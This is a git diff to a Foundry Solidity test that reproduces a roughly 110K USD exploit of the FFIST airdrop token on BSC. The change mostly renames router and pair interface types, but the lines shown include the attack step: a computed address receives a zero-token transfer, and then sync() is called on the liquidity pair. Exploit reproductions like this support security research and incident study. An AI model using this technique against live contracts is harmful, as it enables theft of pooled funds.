@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~110K USD$
 // Attacker : https://bscscan.com/address/0xcc8617331849962c27f91859578dc91922f6f050
@@ -31,7 +30,7 @@ contract ContractTest is Test {
     IairdropToken FFIST = IairdropToken(0x80121DA952A74c06adc1d7f85A237089b57AF347);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     address Pair = 0x7a3Adf2F6B239E64dAB1738c695Cf48155b6e152;
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
     function setUp() public {
         vm.createSelectFork("bsc", 30_113_117);
@@ -59,7 +58,7 @@ contract ContractTest is Test {
             uint160(address(this)) ^ (uint160(FFIST.lastAirdropAddress()) | uint160(block.number)) ^ uint160(Pair)
         );
         FFIST.transfer(to, 0);
-        Uni_Pair_V2(Pair).sync();
+        IUniswapV2Pair(Pair).sync();
     }
 
     function WBNBToFFIST() internal {
